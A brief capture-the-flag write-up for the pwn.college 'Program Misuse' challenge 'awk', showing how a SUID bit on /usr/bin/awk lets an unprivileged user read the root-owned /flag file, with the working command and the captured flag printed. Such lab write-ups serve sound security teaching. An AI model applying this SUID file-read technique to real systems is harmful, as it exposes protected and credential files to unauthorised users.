---
layout: page
title: "Challenge Name: awk"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/awk`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/awk
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/awk
```

- The `s` in `-rws` indicates it's a SUID binary.
- `awk` runs with **root privileges**.

## 🚀 Exploitation

The `awk` command is a powerful text-processing tool in Linux, ideal for parsing, filtering, and formatting structured text, especially columns.


```bash
awk '{print}' /flag
```

Output:
```
pwn.college{IEoiRgfHGotfmjKhSx1ghEegh-N.dZzNxwSM0IzMyEzW}
```
